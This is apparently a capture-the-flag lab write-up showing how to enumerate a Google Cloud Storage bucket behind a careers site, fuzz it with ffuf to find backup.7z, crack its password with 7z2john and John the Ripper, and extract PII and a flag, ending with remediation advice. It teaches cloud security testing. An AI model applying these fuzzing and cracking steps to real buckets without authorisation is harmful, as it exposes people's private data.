## **Reveal Hidden Files in Google Storage**


![](https://i.imgur.com/oHc3KrJ.png)


- Visiting the domain hosted with Google cloud; [https://careers.gigantic-retail.com/index.html](https://careers.gigantic-retail.com/index.html)
- Wappalyzer shows it is truly hosted in GCP


![](https://github.com/user-attachments/assets/6e56874a-0d81-479a-92f3-032157afb3ff)

- Viewing page source discovered a commented storage image path 

```js
<!--                    <div class="right-image">
                        <img src="https://storage.googleapis.com/it-storage-bucket/images/retail1.jpg" alt="Career Image">
                    </div> -->
```

For further enumeration install google cloud cli from [here](https://cloud.google.com/sdk/docs/install-sdk)


- Login to G-cloud

```
 gcloud auth login

Your browser has been opened to visit:

    https://accounts.google.com/o/oauth2/auth?response_type=code&client_id=32555940559.apps.googleusercontent.com&redirect_uri=http%3A%2F%2Flocalhost%3A8085%2F&scope=openid+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcloud-platform+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fappengine.admin+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fsqlservice.login+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcompute+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Faccounts.reauth&state=TwdT2cshR2ovPO71xl6vLzKzy4fZ9n&access_type=offline&code_challenge=6KHmXYqGgs_oDLy12_w6P895_dSPF_iI360bCo--ZiDQ&code_challenge_method=S256

Opening in existing browser session.

You are now logged in as [ol*******@gmail.com].
Your current project is [None].  You can change this setting by running:
  $ gcloud config set project PROJECT_ID
```


- Listing bucket content with google cli = access denied error

```bash
secfortress@sh3llz ~/GCP_Hacking> gcloud storage buckets list gs://it-storage-bucket/

ERROR: (gcloud.storage.buckets.list) [ol******@gmail.com] does not have permission to access b instance [it-storage-bucket] (or it may not exist): ol******@gmail.com does not have storage.buckets.get access to the Google Cloud Storage bucket. Permission 'storage.buckets.get' denied on resource (or it may not exist). This command is authenticated as ol******@gmail.com which is the active account specified by the [core/account] property.

```


- Listing bucket content with google storage utility = access denied error also

```bash
secfortress@sh3llz ~/GCP_Hacking [1]> gsutil ls gs://it-storage-bucket/

AccessDeniedException: 403 ola******@gmail.com does not have storage.objects.list access to the Google Cloud Storage bucket. Permission 'storage.objects.list' denied on resource (or it may not exist).
```


- The stat command list info about object URLs also (good for enumeration purposes)

```bash
secfortress@sh3llz ~/GCP_Hacking [1]> gsutil stat gs://it-storage-bucket/index.html

gs://it-storage-bucket/index.html:
    Creation time:          Tue, 26 Dec 2023 17:16:02 GMT
    Update time:            Tue, 26 Dec 2023 20:16:06 GMT
    Storage class:          STANDARD
    Content-Length:         11407
    Content-Type:           text/html
    Hash (crc32c):          NQiHAw==
    Hash (md5):             rIHCYQzSUEHllo04PfXd0w==
    ETag:                   CMTu57HNrYMDEAI=
    Generation:             1703610962016068
    Metageneration:         2
secfortress@sh3llz ~/GCP_Hacking> gsutil stat gs://it-storage-bucket/index.css

You aren't authorized to read gs://it-storage-bucket/index.css - skipping
No URLs matched: gs://it-storage-bucket/index.css
secfortress@sh3llz ~/GCP_Hacking [1]> gsutil stat gs://it-storage-bucket/js/main.js

gs://it-storage-bucket/js/main.js:
    Creation time:          Tue, 26 Dec 2023 14:33:11 GMT
    Update time:            Tue, 26 Dec 2023 20:27:02 GMT
    Storage class:          STANDARD
    Content-Length:         1924
    Content-Type:           text/javascript
    Hash (crc32c):          02RNaw==
    Hash (md5):             9npVfXhpiN8qVRqKK9M2mA==
    ETag:                   CIqY4P6orYMDEAI=
    Generation:             1703601191259146
    Metageneration:         2

```


- Although there is no sensitive output from the previous command
- It is possible to fuzz for sensitive files in the storage bucket using `ffuf`
- Download the given wordlist with the below command

```bash
wget https://raw.githubusercontent.com/xajkep/wordlists/master/discovery/backup_files_only.txt
```


Then fuzz the storage bucket with the below command

```bash
# -w : wordlist file
# -u : URL of storage bucket
# -c : colorize output
ffuf -w backup_files_only.txt -u https://storage.googleapis.com/it-storage-bucket/FUZZ -mc 200 -c
```

> PS: you don't need to always use `ffuf`, any tool that does the work faster and efficient


```bash
secfortress@sh3llz ~/GCP_Hacking> ffuf -w backup_files_only.txt -u https://storage.googleapis.com/it-storage-bucket/FUZZ -mc 200 -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://storage.googleapis.com/it-storage-bucket/FUZZ
 :: Wordlist         : FUZZ: /home/secfortress/GCP_Hacking/backup_files_only.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

backup.7z               [Status: 200, Size: 22072, Words: 102, Lines: 101, Duration: 367ms]
:: Progress: [1015/1015] :: Job [1/1] :: 136 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```


- Then use the `gsutil` command to download the `.7z` file locally

```bash
secfortress@sh3llz ~/GCP_Hacking> gsutil cp gs://it-storage-bucket/backup.7z .

Copying gs://it-storage-bucket/backup.7z...
- [1 files][ 21.6 KiB/ 21.6 KiB]                                                
Operation completed over 1 objects/21.6 KiB.
```


- The` .7`z file is encrypted
- Grab the hash file with `7z2john` to crack with `JtR`


```
┌──(secfortress㉿sh3llz)-[~/GCP_Hacking]
└─$ 7z2john backup.7z >> hash.txt
ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes

```


- Now crack with `johntheripper`


```bash
secfortress@sh3llz ~/GCP_Hacking> john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 256/256 AVX2 8x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 3 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Cost 4 (data length) is 21837 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
balance          (backup.7z)     
1g 0:00:01:43 DONE (2025-09-06 00:03) 0.009692g/s 124.6p/s 124.6c/s 124.6C/s rainbow2..wendel
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

> The hash cracking process was successful, Password is: **"balance**

Then decrypt the file using the `7z` utility

```bash
secfortress@sh3llz ~/GCP_Hacking> 7z x backup.7z 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:12 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 22072 bytes (22 KiB)

Extracting archive: backup.7z
--
Path = backup.7z
Type = 7z
Physical Size = 22072
Headers Size = 232
Method = LZMA2:16 7zAES
Solid = +
Blocks = 1

    
Enter password (will not be echoed):
Everything is Ok

Files: 2
Size:       54193
Compressed: 22072

```


The retrieve file contains sensitive PII and a flag for the platform; **_Pwnedlabs_**


![](https://i.imgur.com/DuBSc0r.png)


## **Remediation**


- Use a single purpose bucket for web hosting 
- Redact the name of the Google Storage bucket that was hosting the website.
- Store sensitive archives in a private bucket
- Use strong and complex passwords for encrypted files
- Use per-project random codenames such as `deltaorangestouchdown-prod` to name the buckets.


<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>
